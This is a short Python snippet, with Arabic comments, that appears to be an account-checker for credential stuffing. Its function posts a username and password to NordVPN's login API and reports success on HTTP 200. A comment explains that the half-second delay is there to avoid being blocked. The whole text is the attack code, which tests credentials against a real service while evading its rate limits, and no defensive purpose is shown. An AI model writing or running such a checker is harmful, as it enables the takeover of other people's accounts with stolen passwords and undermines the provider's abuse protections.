import requests
import time

def check_account(username, password):
    try:
        # مثال على فحص بسيط
        response = requests.post(
            "https://api.nordvpn.com/v1/users/login",
            data={"username": username, "password": password},
            timeout=10
        )
        time.sleep(0.5)  # لتجنب الحظر
        return response.status_code == 200
    except Exception as e:
        print(f"Error checking {username}: {e}")
        return False
